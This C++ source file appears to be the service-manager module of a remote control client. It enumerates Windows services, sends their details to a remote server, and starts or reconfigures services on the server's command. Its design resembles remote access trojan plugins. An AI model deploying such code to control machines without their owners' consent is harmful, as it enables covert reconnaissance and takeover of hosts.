#include "ClientServiceManager.h"


CClientServiceManager::CClientServiceManager(CIOCPClient* ClientObject):CManager(ClientObject)
{

	printf("服务管理构造函数\r\n");
	m_ServiceModuleBase = LoadLibrary("Service.dll");
	if (m_ServiceModuleBase == NULL)
	{

	}
	m_SeEnumServiceList = (LPFN_SEENUMSERVICELIST)GetProcAddress(m_ServiceModuleBase, "SeEnumServiceList");
	m_SeCofigService = (LPFN_SECONFIGSERVICE)GetProcAddress(m_ServiceModuleBase, "SeCofigService");
	if (m_SeEnumServiceList == NULL||m_SeCofigService==NULL)
	{
		return;
	}
	SendClientServiceList();
}
BOOL CClientServiceManager::SendClientServiceList()
{

	BOOL  IsOk = FALSE;
	DWORD Offset = 1;
	DWORD v7 = 0;
	ULONG ItemCount = 0;
	char* BufferData = NULL;
	vector<_SERVICE_INFORMATION_> ServiceInfo;
	vector<_SERVICE_INFORMATION_>::iterator i;
	if (m_SeEnumServiceList == NULL)
	{
		return IsOk;
	}
	ItemCount = m_SeEnumServiceList(ServiceInfo);
	if (ItemCount == 0)
	{
		return IsOk;
	}
	BufferData = (char*)LocalAlloc(LPTR, 0x1000);
	if (BufferData == NULL)
	{
		goto Exit;
	}
	BufferData[0] = CLIENT_SERVICE_MANAGER_REPLY;

	for (i = ServiceInfo.begin(); i != ServiceInfo.end(); i++)
	{
		v7 = lstrlen(i->ServiceName) + lstrlen(i->DisplayName) +  lstrlen(i->CurrentState) + 
			lstrlen(i->RunWay) + lstrlen(i->BinaryPathName) + 5;
		// 缓冲区太小，再重新分配下
		if (LocalSize(BufferData) < (Offset + v7))
		{
			BufferData = (char*)LocalReAlloc(BufferData, (Offset + v7),
				LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
	
		memcpy(BufferData + Offset,i->ServiceName,lstrlen(i->ServiceName)+1);
		Offset += lstrlen(i->ServiceName)+1;
		memcpy(BufferData + Offset,i->DisplayName,lstrlen(i->DisplayName)+1);
		Offset += lstrlen(i->DisplayName) + 1;
		
		memcpy(BufferData + Offset, i->CurrentState, lstrlen(i->CurrentState) + 1);
		Offset += lstrlen(i->CurrentState) + 1;

		memcpy(BufferData + Offset, i->RunWay, lstrlen(i->RunWay) + 1);
		Offset += lstrlen(i->RunWay) + 1;

		memcpy(BufferData + Offset, i->BinaryPathName, lstrlen(i->BinaryPathName) + 1);
		Offset += lstrlen(i->BinaryPathName) + 1;
	}
	m_ClientObject->OnServerSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;
Exit:
	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}

	return IsOk;
}
void CClientServiceManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{

	case  CLIENT_SERVICE_MANAGER_REQUIRE:
	{
		SendClientServiceList();
		break;
	}

	case CLIENT_SERVICE_CONFIG_REQUIRE:
	{
		ConfigClientService((LPBYTE)BufferData + 1, BufferLength - 1);
		break;
	}
	}
}
void CClientServiceManager::ConfigClientService(PBYTE BufferData, ULONG BufferLength)
{
	BYTE Method = BufferData[0];
	char *ServiceName = (char *)(BufferData + 1);
	if (m_SeCofigService==NULL)
	{
		return;
	}

	if (m_SeCofigService(Method,ServiceName)==TRUE)
	{
		Sleep(500);
		SendClientServiceList();
	}
	
}
CClientServiceManager::~CClientServiceManager()
{
	printf("服务管理析构函数\r\n");

	if (m_ServiceModuleBase != NULL)
	{
		FreeLibrary(m_ServiceModuleBase);
		m_ServiceModuleBase = NULL;
	}


}
